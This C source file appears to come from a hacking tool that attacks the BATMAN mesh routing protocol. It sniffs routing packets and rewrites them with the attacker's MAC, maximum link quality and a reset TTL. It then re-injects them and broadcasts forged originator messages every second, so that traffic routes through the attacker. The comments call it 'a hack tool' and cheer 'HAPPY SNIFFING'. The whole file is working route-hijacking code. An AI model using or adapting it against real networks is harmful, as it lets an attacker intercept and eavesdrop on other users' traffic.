/*
 * Pedro Larbig, Alexander Oberle
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 3 of the GNU General Public
 * License as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA
 * 02110-1301, USA
 *
 */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include "node.h"
#include "packets.h"

u_char *local = NULL;
int local_hna_count = 0;
u_char *local_hna = NULL;
u_char *global_dst;

void forward_packet(const u_char *pkt_in, int len, u_char *ethsrc, pcap_t *inject_here) {
  struct batman_packet *bp;
  u_char *pkt = malloc(len);
  u_char *cpos;
  const u_char *prev;
  
  if ((pkt_in[12] != 0x43) || (pkt_in[13] != 0x05)) {

    return;	//Not a BATMAN packet
  }
  
  memcpy(pkt, pkt_in, len);	//Copy packet to modify it
  
#ifdef DEBUG
  printf("Forward Processing: ");
  print_packetinfo(pkt, len);
#endif
  memcpy(pkt, global_dst, 6);		// try to make another node responsible
  memcpy(pkt+6, ethsrc, 6);	//Write our MAC as source into it
  prev = pkt_in + 6;		//Keeping a pointer to the original sender
  cpos = pkt + 14;		//Points to the start of a BATMAN packet
  
  while ((cpos + sizeof(struct batman_packet)) < (pkt + len)) {
    bp = (struct batman_packet *) cpos;
    
    if (! memcmp(bp->orig, ethsrc, 6)) {
      //Not forwarding packet originating from self! Removing this part from packet
      u_char *nextpkt = cpos + BATMAN_LEN + (6 * bp->num_hna);
      memmove(cpos, nextpkt, (pkt + len) - nextpkt);
      len -= BATMAN_LEN + (6 * bp->num_hna);
      
#ifdef DEBUG
      printf("Removed Self-Reference: ");
      print_packetinfo(pkt, len);
      continue;
#endif
    }

    if (bp->flags & 0x10) {
      bp->flags = 0x40;	// If it was incoming as FirstHop, we forward it as Direct link (VisFlag gets lost, but WHO CARES? this is a hack tool :D)
    } else {
      bp->flags = 0x00;
    }
    bp->tq = 0xFF;	// Max Quality, this way we get as many routes as possible over us, so HAPPY SNIFFING ;)
    bp->ttl = 49;	// Reset TTL to max, so our packets live longer than others
    
    memcpy(bp->prev_sender, prev, 6);	// Updating previous sender
    
    cpos += BATMAN_LEN + (6 * bp->num_hna);
  }

#ifdef DEBUG
  printf("Packet processed: ");
  print_packetinfo(pkt, len);
#endif
  
  if (len < 14 + BATMAN_LEN) {
#ifdef DEBUG
    printf("Skipping route-to-self-only packet\n");
#endif
    free(pkt);
    return;
  }
  
  pcap_inject(inject_here, pkt, len);

#ifdef DEBUG
  printf("Forwarded: ");
  print_packetinfo(pkt, len);
#endif

  free(pkt);
}

void *sniffer_thread(void *pcap_handle) {
  const u_char *packet;
  struct pcap_pkthdr header;

  while(1) {

    packet = pcap_next(pcap_handle, &header);
    if (packet == NULL) continue;

#ifdef DEBUG
    printf("Sniffed: ");
    print_packetinfo(packet, header.len);
#endif

    forward_packet(packet, header.len, local, pcap_handle);

  }
  
  return NULL;
}

void *broadcast_own_ogms(void *pcap_handle) {
  int seqnr = 1;
  u_char *fakepacket;
  int fakelen;

  while (1) {
    seqnr++;
    fakepacket = create_firsthop_packet(&fakelen, local, seqnr, local_hna_count, local_hna);
    
#ifdef DEBUG
    printf("Broadcating own OGM: ");
    print_packetinfo(fakepacket, fakelen);
#endif

    pcap_inject(pcap_handle, fakepacket, fakelen);
    
    free(fakepacket);
    sleep(1);
  }
  
  return NULL;
}

void start_fake_node(pcap_t *pcap_handle, u_char *local_mac, int hna_count, u_char *local_hnas, u_char *dst) {
  pthread_t sniff_thread, ogmbc_thread;
  
  if (! local) local = malloc(6);
  memcpy(local, local_mac, 6);
  
  if (! local_hna) local_hna = malloc(6 * hna_count);
  memcpy(local_hna, local_hnas, 6 * hna_count);
  local_hna_count = hna_count;
  
  global_dst = malloc(6);
  memcpy(global_dst, dst, 6);

  pthread_create(&sniff_thread, NULL, sniffer_thread, pcap_handle);
  pthread_create(&ogmbc_thread, NULL, broadcast_own_ogms, pcap_handle);
}
